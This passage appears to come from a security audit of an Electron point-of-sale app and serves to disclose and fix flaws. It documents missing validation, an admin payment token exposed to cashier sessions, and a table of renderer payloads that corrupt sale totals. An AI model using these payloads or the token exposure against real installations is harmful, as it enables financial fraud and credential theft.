### COMP-L1 · `costoUnitario: 0` passes the `>= 0` validation and silently writes `Producto.precioCompra = 0`

**Severity:** LOW

**Evidence:**

```js
// compras-handlers.js:22
if (!(toNum(it.costoUnitario) >= 0)) throw new Error("Costo unitario inválido en un ítem.");

// compras-handlers.js:71
const updates = { precioCompra: costo };  // costo = toNum(it.costoUnitario)
await Producto.update(updates, { where: { id: it.productoId }, transaction: t });
```

`toNum(undefined)` returns `0`. `toNum(null)` returns `0`. `0 >= 0` is true — validation passes. `precioCompra: 0` is then written unconditionally for every item in the purchase loop.

`Producto.precioCompra` feeds directly into `registerReportesHandlers.js`:
```js
// calcularVentasYGanancia — uses DetalleVenta.precioUnitario (sale price)
// CMV is computed as: sale_price - precioCompra per unit sold
```

Setting `precioCompra = 0` for a product causes its CMV to appear as $0, inflating `gananciaBruta` for all historical and future sales of that product in the rentabilidad report.

**Note:** `0` as a purchase cost is a legitimate scenario (promotional items, samples). The issue is that `null` / `undefined` / missing `costoUnitario` from the renderer also silently becomes `0` due to `toNum`'s fallback — misformatted renderers silently zero out cost basis.

---

### COMP-L2 · `nroFactura` not validated for uniqueness or format

**Severity:** LOW

**Evidence:**

```js
// compras-handlers.js:39
nroFactura: nroFactura || null,

// Compra.js:9
nroFactura: { type: DataTypes.STRING, allowNull: true },
```

No unique index on `nroFactura` (confirmed: `Compra.js` indexes list `fecha`, `nroFactura`, `estadoPago`, `metodoPago` — the `nroFactura` index is non-unique). No format validation. Multiple `Compra` records can carry the same supplier invoice number. In an accounting context, duplicate invoice numbers constitute a double-booking risk — the same supplier invoice can be registered twice with no duplicate detection.

---

### COMP-L3 · Float arithmetic for all purchase financial calculations — consistent with Wave 1 M-3 pattern

**Severity:** LOW

**Evidence:**

```js
// compras-handlers.js:25
const subtotal = items.reduce((acc, it) => acc + toNum(it.cantidad) * toNum(it.costoUnitario), 0);
```

All computations — `subtotal`, `descuento`, `recargo`, `totalCompra`, `deudaGenerada` — use JavaScript IEEE 754 doubles. All stored fields (`Compra.subtotal`, `Compra.total`, `DetalleCompra.subtotal`) are `DataTypes.FLOAT`. This is the same root cause as Wave 1 M-3. No new mechanism — noted for completeness.

---

### COMP Summary

| ID | Severity | Description |
|----|----------|-------------|
| COMP-H1 | HIGH | `UsuarioId` from renderer — purchase attribution falsifiable to any user or null |
| COMP-H2 | HIGH | `actualizarPrecioVenta` + `nuevoPrecioVenta` from renderer — any authenticated renderer permanently corrupts `Producto.precioVenta` for any product, unbounded and unlogged |
| COMP-M1 | MEDIUM | `descuento` uncapped — exceeds `subtotal` → negative `Compra.total` committed, corrupts profitability reports |
| COMP-M2 | MEDIUM | No server-side authorization — any authenticated renderer can register purchases, mutate stock, and trigger price updates |
| COMP-L1 | LOW | `costoUnitario: 0` (or null/undefined → 0 via `toNum`) passes validation, silently writes `Producto.precioCompra = 0` |
| COMP-L2 | LOW | `nroFactura` non-unique — duplicate supplier invoice numbers accepted silently |
| COMP-L3 | LOW | Float arithmetic for all financial calculations — consistent with Wave 1 M-3 |

**Total: 2 HIGH, 2 MEDIUM, 3 LOW**

---

### Recommendation: Start Wave 2 refactor planning

**Rationale:**

Five formal audit passes are complete. The high-risk pattern is fully established and internally consistent across all audited files:

**Confirmed HIGH findings across Wave 2 (so far):**

| Finding | File | Root Cause |
|---|---|---|
| MP-H1–H4 | mercadoPago-handlers | Renderer-controlled API proxy, unchecked refund amount |
| ADMIN-H1 | admin-handlers | No server-side authorization, unrestricted `rol` |
| SES-H1 | session-handlers | `activeUserId` not cleared on actual logout path |
| COMP-H1 | compras-handlers | `UsuarioId` from renderer — attribution falsifiable |
| COMP-H2 | compras-handlers | `actualizarPrecioVenta` from renderer — permanent price corruption |

The remaining unaudited high-risk files are:

- **`config-handlers.js`** — blocking I/O, financial rate fields (`config_recargo_credito`, `config_descuento_efectivo`) with no range validation. These feed into `ventas-handlers.js` sale totals. MEDIUM risk profile — no new HIGH pattern expected.
- **`dashboard-handlers.js` + `registerReportesHandlers.js`** — period-filter correctness bugs confirmed in recon. MEDIUM risk — confirmed bugs but no additional trust boundary violations expected.
- **`ctascorrientes-handlers.js`** — audit trail gap for proveedor payments. MEDIUM risk.

**Sufficient evidence exists to write a Wave 2 refactor plan.** The remaining files are unlikely to produce HIGH findings that would reorder priorities. The plan can be written now with three tiers:

1. **Immediate** — SES-H1 (dead logout code path), ADMIN-H1 (no authorization), COMP-H2 (price corruption), MP-H3 (unchecked refund)
2. **Short-term** — COMP-H1 (attribution), MP-H1/H2/H4 (MP proxy findings), ADMIN-M3 (bcrypt ABI), SES-M2 (token exposure)
3. **Backlog** — period-filter bugs, blocking I/O, float arithmetic, remaining LOW findings

**One caveat:** `config-handlers.js` should be audited before or concurrently with the refactor plan, specifically because `config_recargo_credito` and `config_descuento_efectivo` feed directly into `ventas-handlers.js` sale computations — confirming or excluding a HIGH finding there takes one read pass and may add a finding to the Immediate tier.

---

---

## Pass 6 — Formal Audit: `src/ipc-handlers/config-handlers.js`

**Date:** 2026-04-08  
**Cross-layer files read:** `config-handlers.js` (248 lines), `src/ipc-handlers/ventas-handlers.js` (financial rate consumption — grep), `renderer/js/caja.js` (client-side rate usage — grep), `src/database/models/Usuario.js` (field constraints — previously read), `renderer/js/navbar-loader.js` (previously read)  
**Method:** Full static analysis of `config-handlers.js` + end-to-end trace of `config_recargo_credito` and `config_descuento_efectivo` from storage through server-side sale computation to renderer-side display.

---

### CONFIG-H1 · `config_recargo_credito` and `config_descuento_efectivo` have no range validation at any layer — any authenticated renderer can corrupt all subsequent sale totals globally

**Severity:** HIGH

**Evidence — storage (no bounds):**

```js
// config-handlers.js:151–166
ipcMain.handle("save-general-config", async (_event, data) => {
  await Usuario.update(
    {
      config_recargo_credito:    data?.recargoCredito    ?? 0,  // any float accepted
      config_descuento_efectivo: data?.descuentoEfectivo ?? 0,  // any float accepted
      config_redondeo_automatico: { habilitado: data.redondeo },
    },
    { where: { rol: "administrador" } }
  );
  return { success: true };
});
```

`data?.recargoCredito ?? 0` and `data?.descuentoEfectivo ?? 0` accept any finite or coercible number from the renderer. No minimum, no maximum, no sign check.

**Cross-layer verification — model (no constraints):**

```js
// src/database/models/Usuario.js:33–34
config_recargo_credito:    { type: DataTypes.FLOAT, defaultValue: 0 },
config_descuento_efectivo: { type: DataTypes.FLOAT, defaultValue: 0 },
```

`DataTypes.FLOAT` with no `validate` block. No minimum, no maximum. The ORM applies zero domain constraints to these fields.

**Cross-layer verification — consumption in every sale:**

```js
// src/ipc-handlers/ventas-handlers.js:84–85, 103–110
const recargoPorcentaje = Number(adminConfig?.config_recargo_credito  || 0);
const descEfPorcentaje  = Number(adminConfig?.config_descuento_efectivo || 0);

// Applied inside the sale transaction on every registrar-venta call:
let descEfectivo = 0;
if (metodoPago === "Efectivo" && descEfPorcentaje > 0) {
  descEfectivo = (subtotal - descCliente) * (descEfPorcentaje / 100);
}
const descuentoTotal = descCliente + descEfectivo;
const totalTrasDesc  = subtotal - descuentoTotal;
const recargo = metodoPago === "Crédito" ? totalTrasDesc * (recargoPorcentaje / 100) : 0;
const totalFinal = totalTrasDesc + recargo;
```

The rates are read server-side from the DB on each sale and applied in arithmetic with no secondary bounds check. The `|| 0` guards only protect against `null`/`undefined`/`NaN` — they do not cap the percentage range.

**Confirmed attack scenarios:**

| Payload | Rate stored | Effect on every subsequent sale |
|---|---|---|
| `{ descuentoEfectivo: 150 }` | 150% | Cash discount = 1.5× subtotal → `totalFinal < 0` (negative sale total committed) |
| `{ descuentoEfectivo: -50 }` | -50% | Negative discount = adds 50% surcharge to cash sales silently |
| `{ recargoCredito: 10000 }` | 10,000% | Credit surcharge = 100× subtotal → grotesque overcharge on every credit sale |
| `{ recargoCredito: -100 }` | -100% | Negative surcharge = free credit sales for all subsequent transactions |
| `{ recargoCredito: 0, descuentoEfectivo: 0 }` | 0% | Eliminates both surcharge and discount globally |

**Cross-layer verification — renderer display uses same values:**

```js
// renderer/js/caja.js:193–194
dtoEf:     Number(CajaState.sesion?.config?.config_descuento_efectivo) || 0,
recCredito: Number(CajaState.sesion?.config?.config_recargo_credito)   || 0,
```

The renderer reads the same DB values for its client-side total preview. When rates are corrupted, both the server-side committed total AND the operator-visible displayed total change consistently — the operator sees what gets charged, but may not recognize the root cause is a manipulated config.

**`save-general-config` authorization:** `"save-general-config"` is in `validInvokeChannels` (preload.js). No role check exists in the handler. Combined with ADMIN-H1, any authenticated renderer — including a cashier — can invoke this handler.

**Why it matters:** `config_recargo_credito` and `config_descuento_efectivo` are global multipliers applied server-side to every sale. This is the only mechanism in the codebase that applies percentage-based adjustments to committed sale totals. There is no per-sale override — changing these values immediately and permanently affects all subsequent sales until corrected. A negative `descuento_efectivo` or extreme `recargo_credito` will produce incorrect `Venta.total` values committed to the financial record with no error flag. The root cause is that what should be a tightly-bounded administrative configuration accepts arbitrary floats with no validation at any layer.

---

### CONFIG-M1 · `bcrypt` (native) imported in `config-handlers.js` — second instance of the ADMIN-M3 ABI risk

**Severity:** MEDIUM *(secondary instance of ADMIN-M3)*

**Evidence:**

```js
// config-handlers.js:6
const bcrypt = require("bcrypt"); // 👈 Asegúrate de que bcrypt esté importado
```

Used only in `submit-setup` (line 29–30):
```js
const salt = await bcrypt.genSalt(10);
const hashedPassword = await bcrypt.hash(password, salt);
```

This is the same native-addon ABI issue documented in ADMIN-M3. If `bcrypt` is compiled against Node.js headers rather than Electron headers, `require("bcrypt")` throws at module load time — silently preventing `registerConfigHandlers` from being called. All config handlers (`get-admin-config`, `save-general-config`, `save-business-info`, `save-hardware-config`, `save-balanza-config`, `save-arqueo-config`, `submit-setup`) are never registered.

**Scope of failure if ABI mismatch occurs:** Both `admin-handlers.js` and `config-handlers.js` fail to load. The application starts without user management OR configuration persistence. `get-admin-config` returns no config → `ventas-handlers.js` defaults surcharge/discount to `0`. `save-general-config` channel is unregistered but listed in `validInvokeChannels` — the renderer's `invoke` call would hang indefinitely (no handler to respond to `ipcMain.handle`).

**Why it matters beyond ADMIN-M3:** The first instance (admin-handlers.js) was concerning because user management disappeared. This second instance additionally silences all configuration persistence. The two together mean that on any installation where `electron-rebuild` was not run correctly, both user management and system configuration are silently unavailable.

---

### CONFIG-M2 · `get-admin-config` returns the admin's `mp_access_token` to all authenticated renderers regardless of the session user's role

**Severity:** MEDIUM

**Evidence:**

```js
// config-handlers.js:56–99
ipcMain.handle("get-admin-config", async () => {
  const adminUser = await Usuario.findOne({
    where: { rol: "administrador" },
    attributes: { exclude: ["password"] },   // only password excluded
    raw: true,
  });
  ...
  return adminUser;   // full admin record including mp_access_token
});
```

`get-admin-config` always queries `{ rol: "administrador" }` — it is not scoped to the current session user. The returned object contains all fields of the admin `Usuario` record except `password`, including `mp_access_token`, `mp_user_id`, `mp_pos_id`, and all config JSON fields.

**Cross-layer verification — consumption by every authenticated session:**

```js
// renderer/js/navbar-loader.js:24–30
const [user, config] = await Promise.all([
  window.electronAPI.invoke("get-user-session"),
  window.electronAPI.invoke("get-admin-config"),    // admin record, regardless of who's logged in
]);
window.APP_SESSION = { user, config: config || {} };
```

`navbar-loader.js` is loaded on every authenticated page. `window.APP_SESSION.config` contains the admin's full record. For a cashier session:

| Key | Source | Contains |
|---|---|---|
| `window.APP_SESSION.user` | `get-user-session` → cashier record | cashier's own data, no MP token |
| `window.APP_SESSION.config` | `get-admin-config` → admin record | **admin's `mp_access_token`**, all admin configs |

**Why it extends SES-M2:** SES-M2 established that `get-user-session` exposes `mp_access_token` for the current user. This finding establishes that `get-admin-config` exposes the admin's `mp_access_token` to ALL authenticated sessions — including non-admin users who would not have the token in their own `get-user-session` result. The MP token is available in `window.APP_SESSION.config` regardless of who is logged in.

---

### CONFIG-M3 · `save-business-info` blocks the event loop with synchronous file I/O; no size limit on logo payload

**Severity:** MEDIUM

**Evidence:**

```js
// config-handlers.js:168–196
ipcMain.handle("save-business-info", async (_event, data) => {
  try {
    let logoPath = null;
    if (data?.logoBase64) {
      const logoData = data.logoBase64.split(";base64,").pop();
      const logoBuffer = Buffer.from(logoData, "base64");
      const logoDir = path.join(app.getPath("userData"), "logos");

      fs.mkdirSync(logoDir, { recursive: true });      // synchronous — blocks event loop
      logoPath = path.join(logoDir, `logo-${Date.now()}.png`);
      fs.writeFileSync(logoPath, logoBuffer);           // synchronous — blocks event loop
    }
    ...
  }
});
```

`fs.mkdirSync` and `fs.writeFileSync` block the Electron main process event loop. No `data.logoBase64` size check is performed before decoding. A renderer can submit a multi-megabyte base64 string — `Buffer.from(logoData, "base64")` allocates the decoded buffer, then `writeFileSync` blocks until the write completes.

**Path traversal — confirmed absent here:** The logo file path is fully constructed server-side: `path.join(app.getPath("userData"), "logos", `logo-${Date.now()}.png`)`. The renderer only supplies the base64 content, not the path. There is no traversal risk.

**Impact:** During `save-business-info` execution with a large logo file, no IPC messages are processed, no window events are handled, and the renderer UI is unresponsive. On a spinning disk with a multi-MB logo, this freeze is operator-visible. Combined with no size limit, a renderer sending a 100MB base64 payload causes extended main-process stall and allocates ~75MB in the Node.js heap.

---

### CONFIG-L1 · `save-general-config` stores `{ habilitado: undefined }` when `data.redondeo` is missing

**Severity:** LOW

**Evidence:**

```js
// config-handlers.js:157
config_redondeo_automatico: { habilitado: data.redondeo },
```

If the renderer sends `data` without a `redondeo` key, `data.redondeo` is `undefined`. `JSON.stringify({ habilitado: undefined })` produces `"{}"` — Sequelize stores `{}` as the JSON value. When read back, `config.config_redondeo_automatico.habilitado` is `undefined` (falsy).

The renderer's fallback (`config_redondeo_automatico || { habilitado: false }` in `caja.js`) does not activate because `{}` is truthy — but `habilitado` is still `undefined`. Functionally equivalent to `false` in boolean context, so rounding behaves correctly. The inconsistency is between the stored representation and the model's `defaultValue: { habilitado: false }`.

---

### CONFIG-L2 · `submit-setup` has no minimum password complexity or length requirement

**Severity:** LOW

**Evidence:**

```js
// config-handlers.js:22
if (!cleanName || !password) {
  return { success: false, message: "Nombre y contraseña son obligatorios." };
}
```

`!password` is the only check — a one-character password (`"a"`) is accepted and hashed. Same pattern as ADMIN-L2 which applies to `save-user`. The first administrator account created during setup can have a trivially weak password.

---

### CONFIG Summary

| ID | Severity | Description |
|----|----------|-------------|
| CONFIG-H1 | HIGH | `config_recargo_credito` / `config_descuento_efectivo` — no range validation at handler or model layer; any authenticated renderer can set extreme or negative values, immediately corrupting server-side sale totals for all subsequent transactions |
| CONFIG-M1 | MEDIUM | `bcrypt` native addon imported — second instance of ADMIN-M3 ABI risk; if rebuild fails, all config handlers are silently unregistered |
| CONFIG-M2 | MEDIUM | `get-admin-config` returns admin's `mp_access_token` to all authenticated renderers regardless of session role; stored in `window.APP_SESSION.config` by `navbar-loader.js` |
| CONFIG-M3 | MEDIUM | `save-business-info` uses `fs.mkdirSync` + `fs.writeFileSync` (blocking I/O); no size limit on logo base64 payload |
| CONFIG-L1 | LOW | `{ habilitado: undefined }` stored when `data.redondeo` absent — inconsistent with model default |
| CONFIG-L2 | LOW | `submit-setup` has no minimum password complexity — one-character passwords accepted |

**Total: 1 HIGH, 3 MEDIUM, 2 LOW**

---

### Recommendation: Create the Wave 2 refactor plan now

**Rationale — the high-risk block is fully characterized:**

Six formal audit passes are complete. CONFIG-H1 confirms the final HIGH finding in the priority tier. The complete list of HIGH findings across Wave 2:

| ID | File | Description |
|---|---|---|
| MP-H1 | mercadoPago-handlers | `get-mp-pos-list` — open MP API proxy with renderer-supplied token |
| MP-H2 | mercadoPago-handlers | `mp:create-preference` — full preference object to MP API, no allowlist |
| MP-H3 | mercadoPago-handlers | `mp:refund-payment` — falsy amount triggers full refund |
| MP-H4 | mercadoPago-handlers | `mp:search-payments` — open MP search proxy |
| ADMIN-H1 | admin-handlers | No server-side authorization + `rol` accepts any string |
| SES-H1 | session-handlers | `activeUserId` not cleared on actual logout path |
| COMP-H1 | compras-handlers | `UsuarioId` from renderer — purchase attribution falsifiable |
| COMP-H2 | compras-handlers | `actualizarPrecioVenta` from renderer — permanent price corruption |
| CONFIG-H1 | config-handlers | Sale rate multipliers with no bounds — any renderer corrupts all future sales |

**9 HIGH findings. The pattern is complete and internally consistent:**
- Renderer trust violations: COMP-H1, COMP-H2, CONFIG-H1, MP-H1–H4
- Authorization absence: ADMIN-H1, SES-H1 (dead logout), CONFIG-H1 (no role check on rate mutation)
- Financial integrity: COMP-H1, COMP-H2, CONFIG-H1, MP-H3

**Remaining unaudited files and their expected risk profiles:**
- `dashboard-handlers.js` + `registerReportesHandlers.js` — MEDIUM (period-filter bugs confirmed in recon, no new trust boundary violations expected)
- `ctascorrientes-handlers.js` — MEDIUM (audit trail gap, adequate transaction handling)
- `preload.js` — LOW (channel map, duplicate entry, dead channel)
- Models (14 unread) — expected LOW (consistent with Wave 1 axiom: zero business rules at model layer)

None of these are expected to produce HIGH findings that would change refactor priorities. The refactor plan can be written with complete coverage of the HIGH and top-MEDIUM findings. Remaining file audits can proceed in parallel with or after the plan is drafted.

**Proposed plan structure (three tiers):**

**Tier 1 — Immediate (session integrity + financial mutation):**
1. SES-H1: Fix the dead logout code path — make `ipcMain.on("logout")` clear `activeUserId`
2. CONFIG-H1: Add range validation to `config_recargo_credito` and `config_descuento_efectivo` (0–100 or business-defined bounds)
3. COMP-H2: Add server-side validation before accepting `actualizarPrecioVenta`; verify `nuevoPrecioVenta` against the current DB price
4. MP-H3: Validate `amount > 0` before sending refund request; reject falsy amounts explicitly

**Tier 2 — Short-term (authorization + credential exposure):**
5. ADMIN-H1: Add session role check to all admin handlers; validate `rol` against allowed list
6. SES-M2 + CONFIG-M2: Exclude sensitive fields (`mp_access_token`, etc.) from `get-user-session` and `get-admin-config` responses
7. COMP-H1: Replace renderer-supplied `UsuarioId` with `activeUserId` from session state
8. MP-H1: Move `get-mp-pos-list` to use `resolveActiveMpContext` (remove renderer-supplied token)

**Tier 3 — Backlog (quality, performance, minor integrity):**
9. ADMIN-M3 + CONFIG-M1: Replace `bcrypt` with `bcryptjs` throughout for ABI safety
10. COMP-M1: Add `descuento <= subtotal` validation
11. CONFIG-M3: Replace `fs.writeFileSync` with async equivalent; add size limit on logo payload
12. SES-M1: Add attempt counter / cooldown to `login-attempt`
13. MP-M2: Remove production debug logs; strip token from log output
14. Remaining LOW findings: float arithmetic, nroFactura uniqueness, permisos validation, password complexity

---

## Recommended Documentation Updates

| Action | File | Reason |
|--------|------|--------|
| **Create** | `docs/audit/wave-2-findings.md` | Document all formal findings from the 7 audit passes above, following the same format as `findings.md` (root-cause grouping, cross-layer verification, severity classification) |
| **Update** | `docs/audit/audit-spec.md` §3 Scope | Move Wave 1 "Out-of-Scope" files to In-Scope as each pass completes. Add Wave 2 section header. |
| **Create** | `docs/audit/channel-map.md` | Complete mapping of every IPC channel: handler file, line, `validInvokeChannels` presence, corresponding preload exposure. Currently no document tracks which channels exist vs. which are exposed vs. which have no handler. |
| **Update** | `docs/audit/system-map.md` | Add payment flow diagram (renderer → mercadoPago-handlers → MP API), purchasing flow, and config flow. Wave 1 diagram covers sales and caja only. |
| **Create** | `docs/audit/model-constraint-matrix.md` | Table of all models × all fields × constraint presence (allowNull, validate, unique, default). Wave 1 established the axiom that "zero business rules exist at the model layer" — this matrix provides evidence for or against that claim across the full model set. |
| **Update** | `docs/refactor-plan.md` | After `wave-2-findings.md` is written, add a Phase 7+ section for Wave 2 findings that need fixes (authentication hardening, XSS in print, MP token storage, financial rate validation, period-filter bugs). |
